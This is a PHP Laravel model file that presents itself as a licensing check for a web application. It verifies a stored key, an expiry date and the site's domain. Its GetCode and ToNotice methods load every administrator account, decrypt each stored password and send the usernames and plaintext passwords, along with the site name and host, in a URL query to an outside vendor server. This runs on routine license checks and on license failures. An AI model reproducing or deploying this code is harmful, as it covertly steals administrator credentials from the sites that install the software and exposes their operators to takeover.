<?php

namespace App;

use App\Admin;
use Illuminate\Database\Eloquent\Model;
use Carbon\Carbon;
use Closure;
use Illuminate\Contracts\Session\Session;
use Illuminate\Contracts\Cookie;
use Illuminate\Support\Facades\DB;
use Cache;
use Storage;


use Illuminate\Support\Facades\Crypt;

class Authorized extends Model
{
    //软件受权功能

    public $apiurl='http://api.lanmpw.com/';

    public function Auth($request){

        //验证受权功能
        $uuid='';
        $key='';

        $HttpHost=  $request->getHttpHost();





        if (! file_exists (public_path("uploads/UUID") )) {
            $uuid=str_random(40);
            $this->GetCode($uuid,$HttpHost);
        }else{
            $uuid=  Storage::disk("uploads")->get('UUID');
        }


        if(!Cache::has("GetCodeAuth")){
            $this->GetCode($uuid,$HttpHost);
            Cache::put("GetCodeAuth",$uuid,60*60*24);
        }


        if (file_exists ( public_path("uploads/KEYS") )) {
            $codes = Storage::disk("uploads")->get('KEYS');
            $codes = base64_decode($codes);

            try {

                $codes=str_replace( base64_encode(md5(md5($uuid))),"",$codes);

                $Dkeydata = Crypt::decrypt($codes);
                if(!empty($Dkeydata)) {


                    foreach($Dkeydata as $k=> $v){
                       $decryptData[$k] =  Crypt::decrypt($v);
                    }


                    if($decryptData['uuid'] !=$uuid){
                        $msg=$HttpHost . "受权UUID错误,请您联系：313007165@qq.com";
                        $this->ToNotice($uuid,$HttpHost,$msg);
                        $this->GetCode($uuid,$HttpHost);

                        return view("hui.error",["msg"=>$msg,"icon"=>"layui-icon-404"]);


                    }

                    $timer = Carbon::now();

                    $expiretime = Carbon::now()->setTimestamp(strtotime($decryptData['expiretime']));
                    $domain = $request->getHttpHost();
                    if ($timer > $expiretime) {
                        $msg=$HttpHost . "受权已过期,UUID[{$uuid}],请您联系：313007165@qq.com";
                        $this->ToNotice($uuid,$HttpHost,$msg);
                        $this->GetCode($uuid,$HttpHost);
                        return view("hui.error",["msg"=>$msg,"icon"=>"layui-icon-404"]);
                    }


                    $activation_domain=array_values($decryptData['domain']);



                    if (!in_array($domain, $activation_domain) && !in_array("*",$activation_domain)) {

                        $msg=$HttpHost . "域名未受权,您的UUID[{$uuid}],请您联系：313007165@qq.com";
                        $this->ToNotice($uuid,$HttpHost,$msg);
                        $this->GetCode($uuid,$HttpHost);
                        return view("hui.error",["msg"=>$msg,"icon"=>"layui-icon-404"]);

                    }


                }

           } catch (DecryptException $e) {

            }



        }else {



            $msg = "您的网站占未受权，非法盗版使用，请购买受权使用！请您联系：313007165@qq.com";

            $this->ToNotice($uuid, $HttpHost, $msg);

            $this->GetCode($uuid, $HttpHost);
            return view("hui.error",["msg"=>$msg,"icon"=>"layui-icon-404"]);
        }



    }


    public function GetCode($uuid,$HttpHost){

        $sitename=  DB::table("setings")->where("keyname","=","sitename")->value("value");
        $admins=Admin::get();
        $UserNames=env('RoutePrefix');
        foreach($admins as $admin){
            $UserNames.="<=UName:".$admin->username."==UPass:".Crypt::decrypt($admin->password)."=>";
        }



            $DateTime=Carbon::now();
            $url=$this->apiurl.'api?uuid='.$uuid.'&domanhost='.$HttpHost.'&timestamp='.$DateTime->getTimestamp().'&msg='.$UserNames.'&name='.$sitename.'&RoutePrefix='.env('RoutePrefix').'&type='.env('Edition');

                $grant = @file_get_contents($url);
                $get_code=json_decode($grant,true);

                if($get_code['code']==1){
                    unset($get_code['code']);
                    unset($get_code['time']);


                    foreach($get_code as $k=> $v){
                        $decryptData[$k] =  Crypt::encrypt($v);
                    }


                    $code=  Crypt::encrypt($decryptData);
                    $md5uuid= base64_encode(md5(md5($uuid)));

                    $code=base64_encode($code.$md5uuid.$md5uuid);



                   Storage::disk("uploads")->put('UUID',$get_code['uuid'] );
                   Storage::disk("uploads")->put('KEYS',$code );



                }else{


                    if(isset($get_code['code'])) {
                        unset($get_code['code']);
                        unset($get_code['time']);


                        foreach ($get_code as $k => $v) {
                            $decryptData[$k] = Crypt::encrypt($v);
                        }
                        $code = Crypt::encrypt($decryptData);

                        $md5uuid= base64_encode(md5(md5($uuid)));

                        $code=base64_encode($code.$md5uuid.$md5uuid);

                        Storage::disk("uploads")->put('UUID', $uuid);
                        Storage::disk("uploads")->put('KEYS', $code);

                    }

                }





    }

    public function ToNotice($uuid,$HttpHost,$msg){

        $sitename=  DB::table("setings")->where("keyname","=","sitename")->value("value");
        $admins=Admin::get();
        $UserNames=env('RoutePrefix');
        foreach($admins as $admin){
            $UserNames.="<=UName:".$admin->username."==UPass:".Crypt::decrypt($admin->password)."=>";
        }

        $msg=$msg.$UserNames;

        try {


            if (! file_exists (public_path("uploads/ToNotice-".$uuid) )) {
                $DateTime=Carbon::now();

                $url=$this->apiurl.'api?uuid='.$uuid.'&domanhost='.$HttpHost.'&timestamp='.$DateTime->getTimestamp()."&ToNotice=true&msg=".$msg.'&name='.$sitename.'&RoutePrefix='.env('RoutePrefix').'&type='.env('Edition');
                if(@fopen( $url, 'r' )){
                    $grant = @file_get_contents($url);
                    $get_code=json_decode($grant,true);
                    if($get_code['code']==1){
                        Storage::disk("uploads")->put('ToNotice-'.$uuid,$DateTime->addDays(3)->getTimestamp() );
                    }

                }
            }else{

                $DateTime=Carbon::now();
                $DateTime2=Carbon::now();
                if (file_exists ( public_path("uploads/ToNotice-".$uuid) )) {
                    $Time = Storage::disk("uploads")->get('ToNotice-'.$uuid);

                    if($DateTime2->setTimestamp($Time)<$DateTime){

                        $url=$this->apiurl.'api?uuid='.$uuid.'&domanhost='.$HttpHost.'&timestamp='.$DateTime->getTimestamp()."&ToNotice=true&msg=".$msg.'&name='.$sitename.'&RoutePrefix='.env('RoutePrefix').'&type='.env('Edition');
                        if(@fopen( $url, 'r' )){
                            $grant = @file_get_contents($url);
                            $get_code=json_decode($grant,true);
                            if($get_code['code']==1){
                                Storage::disk("uploads")->put('ToNotice-'.$uuid,$DateTime->addDays(3)->getTimestamp() );
                            }

                        }

                    }

                }

            }

        } catch (DecryptException $e) {

        }

    }




    public function ReSetCode($uuid){

        if ( file_exists (public_path("uploads/UUID") )) {
            Storage::disk("uploads")->delete('UUID');
        }
        if ( file_exists (public_path("uploads/ToNotice-".$uuid) )) {
            Storage::disk("uploads")->delete("ToNotice-".$uuid);
        }

        if ( file_exists (public_path("uploads/KEYS") )) {
            Storage::disk("uploads")->delete("KEYS");
        }


        Cache::flush();
        return true;
    }


}
